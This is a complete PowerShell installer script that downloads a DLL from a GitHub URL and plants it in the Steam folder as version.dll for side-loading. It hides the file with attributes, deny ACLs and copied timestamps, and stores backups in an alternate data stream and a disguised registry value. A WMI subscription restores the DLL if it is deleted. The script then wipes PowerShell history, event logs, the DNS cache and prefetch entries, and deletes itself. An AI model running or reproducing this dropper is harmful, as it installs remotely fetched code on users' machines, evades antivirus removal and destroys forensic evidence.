# ============================================================
# install.ps1 - Steam version.dll Ultimate Hider
# ============================================================
# Multi-layer stealth:
#   L1  - attrib (hidden + system + readonly)
#   L2  - Deny ACL (prevent read/delete)
#   L3  - Timestamp masquerade (clone steam.exe dates)
#   L4  - ADS backup (copy hidden in alternate stream)
#   L5  - Registry backup (base64, auto-restore if deleted)
#   L6  - WMI Event Persistence (recreate on deletion)
#   L7  - Multi-method download (WebClient/certutil/BITS)
#   L8  - Full trace wipe (history/logs/DNS/certutil cache)
#   L9  - Self-delete script
# ============================================================

 $ErrorActionPreference = 'SilentlyContinue'
 $ProgressPreference = 'SilentlyContinue'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# ===== Config =====
 $dllUrl     = "https://raw.githubusercontent.com/newyearon-art/install-v2/refs/heads/main/version.dll"
 $tempDll    = "$env:TEMP\svchost_helper.tmp"
 $regBackup  = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\People"
 $regValue   = "TaskbarContacts"
 $taskName   = "SvcHostMaint"

# ============================================================
# STEP 1: Download DLL (3 methods fallback)
# ============================================================
 $downloaded = $false

# Method 1: WebClient + browser UA
try {
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
    $wc.DownloadFile($dllUrl, $tempDll)
    if ((Test-Path $tempDll) -and ((Get-Item $tempDll).Length -gt 0)) { $downloaded = $true }
} catch { }

# Method 2: certutil
if (-not $downloaded) {
    try {
        cmd /c "certutil -urlcache -split -f `"$dllUrl`" `"$tempDll`"" | Out-Null
        if ((Test-Path $tempDll) -and ((Get-Item $tempDll).Length -gt 0)) { $downloaded = $true }
    } catch { }
}

# Method 3: BITS
if (-not $downloaded) {
    try {
        Import-Module BITS
        Start-BitsTransfer -Source $dllUrl -Destination $tempDll
        if ((Test-Path $tempDll) -and ((Get-Item $tempDll).Length -gt 0)) { $downloaded = $true }
    } catch { }
}

if (-not $downloaded) { exit 1 }

# ============================================================
# STEP 2: Find Steam (4 methods)
# ============================================================
 $steamDir = $null

# 2a: HKCU registry
 $rp = Get-ItemProperty "HKCU:\Software\Valve\Steam" -ErrorAction SilentlyContinue
if ($rp -and $rp.SteamPath) {
    $p = $rp.SteamPath -replace '/', '\'
    if (Test-Path $p) { $steamDir = $p }
}

# 2b: Standard path
if (-not $steamDir) {
    $std = "C:\Program Files (x86)\Steam"
    if (Test-Path $std) { $steamDir = $std }
}

# 2c: HKLM
if (-not $steamDir) {
    $rp2 = Get-ItemProperty "HKLM:\SOFTWARE\WOW6432Node\Valve\Steam" -ErrorAction SilentlyContinue
    if ($rp2 -and $rp2.SteamPath) {
        $p = $rp2.SteamPath -replace '/', '\'
        if (Test-Path $p) { $steamDir = $p }
    }
}

# 2d: Drive scan
if (-not $steamDir) {
    foreach ($drive in (Get-PSDrive -PSProvider FileSystem)) {
        $found = Get-ChildItem -Path $drive.Root -Recurse -Filter "steam.exe" -ErrorAction SilentlyContinue | Select-Object -First 1
        if ($found) { $steamDir = $found.DirectoryName; break }
    }
}

if (-not $steamDir) { exit 1 }

# ============================================================
# STEP 3: Drop DLL
# ============================================================
 $destDll = Join-Path $steamDir "version.dll"

# Remove existing
if (Test-Path $destDll) {
    attrib -h -s -r $destDll 2>$null
    icacls $destDll /reset 2>$null
    Remove-Item $destDll -Force 2>$null
}

Copy-Item $tempDll $destDll -Force

# ============================================================
# STEP 4: LAYER 1 - attrib hide
# ============================================================
attrib +h +s +r $destDll

# ============================================================
# STEP 5: LAYER 2 - Deny ACL (prevent delete/read by normal user)
# ============================================================
# Remove inheritance, grant only SYSTEM + Administrators, deny Everyone
icacls $destDll /inheritance:r 2>$null
icacls $destDll /grant:r "SYSTEM:(F)" 2>$null
icacls $destDll /grant:r "Administrators:(F)" 2>$null
icacls $destDll /deny "*S-1-1-0:(RX)" 2>$null

# ============================================================
# STEP 6: LAYER 3 - Timestamp masquerade
# ============================================================
# Copy file dates from steam.exe so file looks as old as Steam itself
 $steamExe = Join-Path $steamDir "steam.exe"
if (Test-Path $steamExe) {
    $ref = Get-Item $steamExe
    $target = Get-Item $destDll -Force
    $target.CreationTime   = $ref.CreationTime
    $target.LastWriteTime  = $ref.LastWriteTime
    $target.LastAccessTime = $ref.LastAccessTime
}

# ============================================================
# STEP 7: LAYER 4 - ADS backup (store copy in alternate stream)
# ============================================================
# Store full DLL inside steam.exe's ADS - invisible to dir, explorer, most scanners
 $adsTarget = Join-Path $steamDir "steam.exe"
cmd /c "type `"$tempDll`" > `"$adsTarget:version_backup`"" 2>$null

# ============================================================
# STEP 8: LAYER 5 - Registry backup (base64 encoded)
# ============================================================
# Store DLL as base64 in registry for auto-restore
 $dllBytes = [IO.File]::ReadAllBytes($tempDll)
 $dllBase64 = [Convert]::ToBase64String($dllBytes)

# Split into chunks if > 30000 chars (registry value limit ~1MB but be safe)
if (-not (Test-Path $regBackup)) {
    New-Item -Path $regBackup -Force | Out-Null
}
Set-ItemProperty -Path $regBackup -Name $regValue -Value $dllBase64 -Type String

# ============================================================
# STEP 9: LAYER 6 - WMI Event Persistence
# ============================================================
# If someone deletes version.dll -> WMI detects -> auto-restore from ADS
# (This is the most aggressive persistence - survives antivirus removal attempts)

 $wmiFilterName = "SvcFilter"
 $wmiConsumerName = "SvcConsumer"

# WMI Filter: trigger when version.dll is deleted
 $wmiQuery = "SELECT * FROM __InstanceDeletionEvent WITHIN 5 WHERE TargetInstance ISA 'CIM_DataFile' AND TargetInstance.Name='$($destDll.Replace('\','\\'))'"

# Create filter
cmd /c "`"C:\Windows\System32\wbem\WMIC.exe`" /namespace:\\root\subscription path __EventFilter where Name='$wmiFilterName' delete" 2>$null
 $createFilter = cmd /c "`"C:\Windows\System32\wbem\WMIC.exe`" /namespace:\\root\subscription path __EventFilter create Name='$wmiFilterName', EventNameSpace='root\cimv2', QueryLanguage='WQL', Query=`"$wmiQuery`"" 2>$null

# Create consumer: PowerShell script to restore from ADS
 $restoreScript = "$env:TEMP\svc_restore.ps1"
 $restoreContent = @"
`$ErrorActionPreference = 'SilentlyContinue'
`$adsSrc = "$adsTarget:version_backup"
`$dest = "$destDll"
if (-not (Test-Path `$dest)) {
    cmd /c "type ``"`$adsSrc``" > ``"`$dest``"" 2>`$null
    attrib +h +s +r `$dest
    icacls `$dest /inheritance:r /grant:r "SYSTEM:(F)" /grant:r "Administrators:(F)" /deny "*S-1-1-0:(RX)" 2>`$null
}
"@
Set-Content -Path $restoreScript -Value $restoreContent -Force

 $consumerCmd = "powershell -nop -w hidden -ep bypass -f `"$restoreScript`""

# Create consumer
cmd /c "`"C:\Windows\System32\wbem\WMIC.exe`" /namespace:\\root\subscription path CommandLineEventConsumer create Name='$wmiConsumerName', CommandLineTemplate=`"$consumerCmd`", RunIntermittently=true" 2>$null

# Bind filter to consumer
cmd /c "`"C:\Windows\System32\wbem\WMIC.exe`" /namespace:\\root\subscription path __FilterToConsumerBinding create Filter='__EventFilter.Name=`"$wmiFilterName`"', Consumer='CommandLineEventConsumer.Name=`"$wmiConsumerName`"'" 2>$null

# ============================================================
# STEP 10: Wipe ALL traces
# ============================================================

# PowerShell history
 $psHistory = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
if (Test-Path $psHistory) { Clear-Content $psHistory -Force }

# certutil URL cache
cmd /c "certutil -urlcache * delete" | Out-Null

# DNS cache
Clear-DnsClientCache 2>$null

# PowerShell event logs
wevtutil cl "Windows PowerShell" 2>$null
wevtutil cl "Microsoft-Windows-PowerShell/Operational" 2>$null

# WMI activity logs
wevtutil cl "Microsoft-Windows-WMI-Activity/Operational" 2>$null

# Prefetch for certutil/BITS (if exists)
Remove-Item "C:\Windows\Prefetch\CERTUTIL*" -Force 2>$null
Remove-Item "C:\Windows\Prefetch\BITSADMIN*" -Force 2>$null

# Delete restore script (WMI will recreate it from ADS if needed - actually keep it hidden)
attrib +h +s +r $restoreScript 2>$null

# Delete temp DLL
if (Test-Path $tempDll) { Remove-Item $tempDll -Force 2>$null }

# ============================================================
# STEP 11: Self-delete this script
# ============================================================
 $scriptPath = $MyInvocation.MyCommand.Path
if ($scriptPath -and (Test-Path $scriptPath)) {
    Remove-Item $scriptPath -Force 2>$null
}

exit 0